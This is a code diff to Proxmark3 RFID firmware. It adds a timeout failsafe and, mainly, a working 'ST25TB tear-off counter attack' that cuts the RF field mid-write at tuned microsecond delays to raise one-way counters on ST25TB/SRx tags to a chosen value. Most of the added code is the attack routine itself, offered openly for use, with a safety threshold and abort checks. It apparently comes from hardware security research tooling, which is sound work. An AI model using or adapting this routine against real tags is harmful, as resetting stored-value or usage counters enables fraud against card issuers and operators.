@@ -1379,10 +1379,23 @@ static int Get14443bAnswerFromTag(uint8_t *response, uint16_t max_len, uint32_t 
     LED_D_ON();
     FpgaWriteConfWord(FPGA_MAJOR_MODE_HF_READER | FPGA_HF_READER_SUBCARRIER_848_KHZ | FPGA_HF_READER_MODE_RECEIVE_IQ);
 
+    uint32_t wait_start_time = GetTickCount();
+
     for (;;) {
 
         volatile uint16_t behindBy = ((uint16_t *)AT91C_BASE_PDC_SSC->PDC_RPR - upTo) & (DMA_BUFFER_SIZE - 1);
         if (behindBy == 0) {
+            WDT_HIT();
+            if (BUTTON_PRESS()) {
+                ret = PM3_EOPABORTED;
+                break;
+            }
+            // Failsafe: if the FPGA SSC clock drops completely, DMA will freeze eternally.
+            // We use the ARM's main tick counter (1ms) instead of the SSP clock.
+            if (samples == 0 && GetTickCountDelta(wait_start_time) > 200) {
+                ret = PM3_ETIMEOUT;
+                break;
+            }
             continue;
         }
 
@@ -2608,6 +2621,459 @@ void SniffIso14443b(void) {
 static void iso14b_set_trigger(bool enable) {
     g_trigger = enable;
 }
+
+//=============================================================================
+// ST25TB COUNTER TEAR-OFF IMPLEMENTATION
+// Ported from near-field-chaos / hf_st25_tearoff standalone
+//=============================================================================
+
+// Tear-off constants
+#define TEAROFF_INITIAL_DELAY_US     150
+#define TEAROFF_MIN_DELAY_US         0
+#define TEAROFF_ADJUSTMENT_US_DEF    25
+#define TEAROFF_WRITE_RETRY_COUNT    30
+#define TEAROFF_CONSOLIDATE_READS    6
+#define TEAROFF_CONSOLIDATE_WAIT_RD  2
+#define TEAROFF_CONSOLIDATE_WAIT_MS  2000
+
+// Bit manipulation macros
+#define IS_ONE_BIT_T(value, index)  ((value) & ((uint32_t)1 << (index)))
+#define IS_ZERO_BIT_T(value, index) (!IS_ONE_BIT_T(value, index))
+
+// Simple PRNG for randomization in tear-off value selection
+static unsigned long s_tearoff_prng_seed = 1;
+static int tearoff_rand(void) {
+    s_tearoff_prng_seed = s_tearoff_prng_seed * 1103515245 + 12345;
+    return (unsigned int)(s_tearoff_prng_seed / 65536) % 32768;
+}
+
+// Quick field restart after tear-off (FPGA bitstream already loaded, buffers allocated).
+// This is MUCH faster than full iso14443b_setup() since it skips:
+//  - FpgaDownloadAndGo (bitstream already cached)
+//  - BigBuf_free + BigBuf_calloc (demod buffers persist)
+//  - 100ms field stabilization (tag only needs ~20ms to power up)
+static void tearoff_field_on(void) {
+    // Reset the AT91 SSC PDC (DMA) receive buffer before each field-on
+    // by mirroring iso14443b_setup() memory allocations for Demod14b/Uart14b.
+    BigBuf_free();
+    Demod14bInit(BigBuf_calloc(MAX_FRAME_SIZE), MAX_FRAME_SIZE);
+    Uart14bInit(BigBuf_calloc(MAX_FRAME_SIZE));
+
+    SetAdcMuxFor(GPIO_MUXSEL_HIPKD);
+    FpgaSetupSsc(FPGA_MAJOR_MODE_HF_READER); // programs PDC with fresh BigBuf address
+#ifdef RDV4
+    FpgaWriteConfWord(FPGA_MAJOR_MODE_HF_READER | FPGA_HF_READER_MODE_SEND_SHALLOW_MOD_RDV4);
+#else
+    FpgaWriteConfWord(FPGA_MAJOR_MODE_HF_READER | FPGA_HF_READER_MODE_SEND_SHALLOW_MOD);
+#endif
+    // Field stabilization: tag needs time to power up from RF.
+    SpinDelayUs(250);
+    StartCountSspClk();
+    iso14b_set_fwt(8);
+    s_field_on = true;
+}
+
+// Cut the RF field.
+// drain_capacitor: pass true after a tear-off write to drain the tag's charge pump
+static void tearoff_field_off(bool drain_capacitor) {
+    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
+    s_field_on = false;
+    if (drain_capacitor) {
+        SpinDelayUs(500); // ST25TB tRST minimum drain
+    }
+}
+
+static void tearoff_exit(void) {
+    g_tearoff_enabled = false;
+    g_tearoff_delay_us = 0;
+    // Force a full FPGA bitstream reload on the next HF command.
+    // After hundreds of rapid field on/off cycles, the FPGA's internal
+    // state machine (SSC/DMA) can become corrupted even though its bitstream
+    // is technically loaded. Invalidating the cache forces FpgaDownloadAndGo()
+    // to do a complete re-initialization next time.
+    FpgaResetBitstream();
+    switch_off();
+    SpinDelay(20);
+    BigBuf_free_keep_EM();
+    s_field_on = false;
+}
+
+// Read a single ST25TB/SRx block with lightweight field cycle
+static int tearoff_read_block(uint8_t block_address, uint32_t *block_value) {
+    int res;
+    iso14b_card_select_t card;
+
+    tearoff_field_on();
+
+    res = iso14443b_select_srx_card(&card);
+    if (res != PM3_SUCCESS) {
+        tearoff_field_off(false); // select failed, no write in progress
+        return res;
+    }
+
+    uint8_t block[ISO14B_BLOCK_SIZE];
+    res = read_14b_srx_block(block_address, block);
+    if (res == PM3_SUCCESS) {
+        *block_value = (uint32_t)block[0] |
+                       ((uint32_t)block[1] << 8) |
+                       ((uint32_t)block[2] << 16) |
+                       ((uint32_t)block[3] << 24);
+    }
+
+    tearoff_field_off(false); // plain read, no write in progress
+    return res;
+}
+
+// Low-level write command (no response expected for SRx write)
+static int tearoff_cmd_write_block(uint8_t block_address, uint8_t *block) {
+    uint8_t cmd[] = {ISO14443B_WRITE_BLK, block_address, block[0], block[1], block[2], block[3], 0x00, 0x00};
+    AddCrc14B(cmd, 6);
+
+    uint32_t start_time = 0;
+    uint32_t eof_time = 0;
+    CodeAndTransmit14443bAsReader(cmd, sizeof(cmd), &start_time, &eof_time, true);
+    return PM3_SUCCESS;
+}
+
+// Write a block then cut RF at precise timing for tear-off effect
+static void tearoff_write_block(uint8_t block_address, uint32_t data, uint16_t tearoff_delay_us) {
+
+    uint8_t block[ISO14B_BLOCK_SIZE];
+    block[0] = (data & 0xFF);
+    block[1] = (data >> 8) & 0xFF;
+    block[2] = (data >> 16) & 0xFF;
+    block[3] = (data >> 24) & 0xFF;
+
+    tearoff_field_on();
+
+    iso14b_card_select_t card;
+    int res = iso14443b_select_srx_card(&card);
+    if (res != PM3_SUCCESS) {
+        tearoff_field_off(false); // select failed pre-write, no EEPROM activity
+        return;
+    }
+
+    g_tearoff_enabled = true;
+    g_tearoff_delay_us = tearoff_delay_us;
+
+    tearoff_cmd_write_block(block_address, block);
+
+    if (tearoff_hook() == PM3_ETEAROFF) {
+        s_field_on = false;
+        // Drain the tag's charge pump capacitor so POR triggers cleanly on next field-on.
+        SpinDelayUs(500);
+    } else {
+        tearoff_field_off(false);
+    }
+}
+
+// Write then verify with retries
+static int8_t tearoff_retry_write_verify(uint8_t block_address, uint32_t target_value,
+                                         uint32_t max_try_count, int sleep_time_ms,
+                                         uint32_t *read_back_value) {
+    uint32_t i = 0;
+    *read_back_value = ~target_value;
+
+    while (*read_back_value != target_value && i < max_try_count) {
+        tearoff_write_block(block_address, target_value, 6000); // Long delay = reliable write
+        if (sleep_time_ms > 0) SpinDelayUsPrecision(sleep_time_ms * 1000);
+        tearoff_read_block(block_address, read_back_value);
+        if (sleep_time_ms > 0) SpinDelayUsPrecision(sleep_time_ms * 1000);
+        i++;
+    }
+
+    return (*read_back_value == target_value) ? 0 : -1;
+}
+
+// Check if a value is stable (consolidated) across multiple reads
+static int8_t tearoff_is_consolidated(uint8_t block_address, uint32_t value,
+                                      int repeat_read, int sleep_time_ms,
+                                      uint32_t *read_value) {
+    int result;
+    for (int i = 0; i < repeat_read; i++) {
+        if (sleep_time_ms > 0) SpinDelayUsPrecision(sleep_time_ms * 1000);
+        result = tearoff_read_block(block_address, read_value);
+        if (result != 0 || value != *read_value) {
+            return -1;
+        }
+    }
+    return 0;
+}
+
+// Consolidate a block to a stable state with decrement writes
+static int8_t tearoff_consolidate_block(uint8_t block_address, uint32_t current_value,
+                                        uint32_t target_value, uint32_t *read_back_value) {
+    int8_t result;
+    uint32_t consolidation_value;
+
+    if (target_value <= 0xFFFFFFFD && current_value >= (target_value + 2)) {
+        consolidation_value = target_value + 2;
+    } else {
+        consolidation_value = current_value;
+    }
+
+    result = tearoff_retry_write_verify(block_address, consolidation_value - 1,
+                                        TEAROFF_WRITE_RETRY_COUNT, 0, read_back_value);
+    if (result != 0) {
+        Dbprintf("Consolidation failed at step 1 (write 0x%08X)", consolidation_value - 1);
+        return -1;
+    }
+
+    if (*read_back_value != 0xFFFFFFFE || target_value == 0xFFFFFFFD) {
+        result = tearoff_retry_write_verify(block_address, consolidation_value - 2,
+                                            TEAROFF_WRITE_RETRY_COUNT, 0, read_back_value);
+        if (result != 0) {
+            Dbprintf("Consolidation failed at step 2 (write 0x%08X)", consolidation_value - 2);
+            return -1;
+        }
+    }
+
+    if (result == 0 && target_value > 0xFFFFFFFD && *read_back_value > 0xFFFFFFFD) {
+        result = tearoff_is_consolidated(block_address, *read_back_value,
+                                         TEAROFF_CONSOLIDATE_READS, 0, read_back_value);
+        if (result == 0) {
+            result = tearoff_is_consolidated(block_address, *read_back_value,
+                                             TEAROFF_CONSOLIDATE_WAIT_RD,
+                                             TEAROFF_CONSOLIDATE_WAIT_MS, read_back_value);
+            if (result != 0) {
+                Dbprintf("Consolidation failed stability check (long wait)");
+                return -1;
+            }
+        } else {
+            Dbprintf("Consolidation failed stability check (short wait)");
+            return -1;
+        }
+    }
+
+    return 0;
+}
+
+// Calculate next value to attempt for tear-off write
+static uint32_t tearoff_next_value(uint32_t current_value, bool randomness) {
+    uint32_t value = 0;
+    int8_t index = 31;
+
+    if (current_value < 0x0000FFFF) {
+        return (current_value > 0) ? current_value - 1 : 0;
+    }
+
+    while (index >= 0) {
+        if (value == 0 && IS_ONE_BIT_T(current_value, index)) {
+            value = 0xFFFFFFFF >> (31 - index);
+            index--;
+        }
+
+        if (value != 0 && IS_ZERO_BIT_T(current_value, index)) {
+            index++;
+            value &= ~((uint32_t)1 << index);
+
+            if (randomness && value < 0xF0000000 && index > 1) {
+                value ^= ((uint32_t)1 << (tearoff_rand() % index));
+            }
+            return value;
+        }
+
+        index--;
+    }
+
+    return (current_value > 0) ? current_value - 1 : 0;
+}
+
+// Adjust tear-off timing
+static void tearoff_adjust_timing(int *tear_off_us, uint32_t tear_off_adjustment_us) {
+    *tear_off_us -= tear_off_adjustment_us;
+    if (*tear_off_us < TEAROFF_MIN_DELAY_US) {
+        *tear_off_us = TEAROFF_MIN_DELAY_US;
+    }
+}
+
+// Log tear-off attempt with binary representation
+static void tearoff_log(int tear_off_us, const char *color, uint32_t value) {
+    char bin[33];
+    for (int i = 31; i >= 0; i--) {
+        bin[31 - i] = IS_ONE_BIT_T(value, i) ? '1' : '0';
+    }
+    bin[32] = '\0';
+    Dbprintf("%s%08X%s : %s%s%s : %d us", color, value, "\033[0m", color, bin, "\033[0m", tear_off_us);
+}
+
+// Payload structure for tear-off command
+typedef struct {
+    uint8_t  block_address;
+    uint32_t target_value;
+    uint32_t tear_off_adjustment_us;
+    uint32_t safety_value;
+    uint32_t start_time_us;
+} PACKED st25tb_tearoff_params_t;
+
+// Main ST25TB tear-off function, called from appmain.c
+void ST25TB_TearOff(const uint8_t *data) {
+    const st25tb_tearoff_params_t *params = (const st25tb_tearoff_params_t *)data;
+
+    uint8_t block_address = params->block_address;
+    uint32_t target_value = params->target_value;
+    uint32_t tear_off_adjustment_us = params->tear_off_adjustment_us;
+    uint32_t safety_value = params->safety_value;
+    uint32_t start_time_us = params->start_time_us;
+
+    int result;
+    bool trigger = true;
+
+    uint32_t read_value = 0;
+    uint32_t current_value = 0;
+    uint32_t last_consolidated_value = 0;
+    uint32_t tear_off_value = 0;
+
+    // Start delay: user-specified or default TEAROFF_INITIAL_DELAY_US (150 us)
+    int tear_off_us = (start_time_us > 0) ? (int)start_time_us : TEAROFF_INITIAL_DELAY_US;
+    if (tear_off_adjustment_us == 0) {
+        tear_off_adjustment_us = TEAROFF_ADJUSTMENT_US_DEF;
+    }
+
+    // One-time full setup: loads FPGA bitstream, allocates demod buffers,
+    // configures ADC mux and SSC. All subsequent field cycles use the
+    // lightweight tearoff_field_on/off which skip the heavy initialization.
+    iso14443b_setup();
+    set_tracing(true);
+    tearoff_field_off(false); // Start with field off, tearoff_read_block will turn it on
+
+    // Initial read
+    result = tearoff_read_block(block_address, &current_value);
+    if (result != PM3_SUCCESS) {
+        Dbprintf("Initial read failed for block %d", block_address);
+        reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_ESOFT, NULL, 0);
+        tearoff_exit();
+        return;
+    }
+
+    tear_off_value = tearoff_next_value(current_value, false);
+
+    Dbprintf("");
+    Dbprintf(_CYAN_("ST25TB Tear-off counter attack"));
+    Dbprintf("------------------------------");
+    Dbprintf(" Target block: %d", block_address);
+    Dbprintf("Current value: 0x%08X", current_value);
+    Dbprintf(" Target value: 0x%08X", target_value);
+    Dbprintf(" Safety value: 0x%08X", safety_value);
+    Dbprintf("Adjustment us: %u", tear_off_adjustment_us);
+    Dbprintf("");
+
+    if (current_value == target_value) {
+        Dbprintf(_GREEN_("Current value already matches target."));
+        reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_SUCCESS, (uint8_t *)&current_value, sizeof(current_value));
+        tearoff_exit();
+        return;
+    }
+
+    if (tear_off_value == 0 && current_value != 0) {
+        Dbprintf("Tear-off technique not possible from current value.");
+        reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_ESOFT, NULL, 0);
+        tearoff_exit();
+        return;
+    }
+
+    // Main tear-off loop
+    uint32_t loop_count = 0;
+    int consecutive_read_fails = 0;
+
+    for (;;) {
+        WDT_HIT();
+        loop_count++;
+
+        // Send WTX keepalive every ~500 iterations to prevent USB timeout
+        // Each iteration takes ~1-10ms (select + write + read), so this
+        // fires roughly every 1-5 seconds. We request 10s extension each time.
+        if ((loop_count % 500) == 0) {
+            send_wtx(10000);
+        }
+
+        // Check for user abort (button press or USB data)
+        if (BUTTON_PRESS() || data_available()) {
+            Dbprintf("Tear-off stopped by user.");
+            reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_EOPABORTED, (uint8_t *)&current_value, sizeof(current_value));
+            tearoff_exit();
+            return;
+        }
+
+        // Safety check
+        if (tear_off_value < safety_value) {
+            Dbprintf("Stopped. Safety threshold reached (next value 0x%08X < safety 0x%08X)",
+                     tear_off_value, safety_value);
+            reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_ESOFT, (uint8_t *)&current_value, sizeof(current_value));
+            tearoff_exit();
+            return;
+        }
+
+        // Perform tear-off write attempt
+        tearoff_write_block(block_address, tear_off_value, tear_off_us);
+
+        // Read back
+        result = tearoff_read_block(block_address, &read_value);
+        if (result != 0) {
+            consecutive_read_fails++;
+            if (consecutive_read_fails > 30) {
+                Dbprintf("Read failed %d times consecutively. Is the tag present?", consecutive_read_fails);
+                reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_ESOFT, (uint8_t *)&current_value, sizeof(current_value));
+                tearoff_exit();
+                return;
+            }
+            tear_off_us++;
+            continue; // Retry if read fails
+        }
+        consecutive_read_fails = 0;
+
+        // Analyze result
+        if (read_value > current_value) {
+            // Partial write success (tear-off glitch worked)
+            if (read_value >= 0xFFFFFFFE ||
+                    (read_value - 2) > target_value ||
+                    read_value != last_consolidated_value ||
+                    ((read_value & 0xF0000000) > (current_value & 0xF0000000))) {
+
+                result = tearoff_consolidate_block(block_address, read_value,
+                                                   target_value, &current_value);
+                if (result == 0 && current_value == target_value) {
+                    tearoff_log(tear_off_us, "\033[32m", read_value);
+                    Dbprintf("");
+                    Dbprintf(_GREEN_("Target value 0x%08X reached successfully!"), target_value);
+                    reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_SUCCESS, (uint8_t *)&current_value, sizeof(current_value));
+                    tearoff_exit();
+                    return;
+                }
+                if (read_value != last_consolidated_value) {
+                    tearoff_adjust_timing(&tear_off_us, tear_off_adjustment_us);
+                }
+                last_consolidated_value = read_value;
+                tear_off_value = tearoff_next_value(current_value, false);
+                trigger = true;
+                tearoff_log(tear_off_us, "\033[32m", read_value);
+            }
+        } else if (read_value == tear_off_value) {
+            // Full write went through (no tear-off effect)
+            if (trigger) {
+                tear_off_value = tearoff_next_value(tear_off_value, true);
+                trigger = false;
+            } else {
+                tear_off_value = tearoff_next_value(read_value, false);
+                trigger = true;
+            }
+            current_value = read_value;
+            tearoff_adjust_timing(&tear_off_us, tear_off_adjustment_us);
+            tearoff_log(tear_off_us, "\033[34m", read_value);
+        } else if (read_value < tear_off_value) {
+            // Partial write but went lower
+            tear_off_value = tearoff_next_value(read_value, false);
+            tearoff_adjust_timing(&tear_off_us, tear_off_adjustment_us);
+            current_value = read_value;
+            trigger = true;
+            tearoff_log(tear_off_us, "\033[31m", read_value);
+        }
+
+        // Increment timing for next attempt
+        tear_off_us++;
+    }
+}
+
 
 void SendRawCommand14443B(iso14b_raw_cmd_t *p) {
 
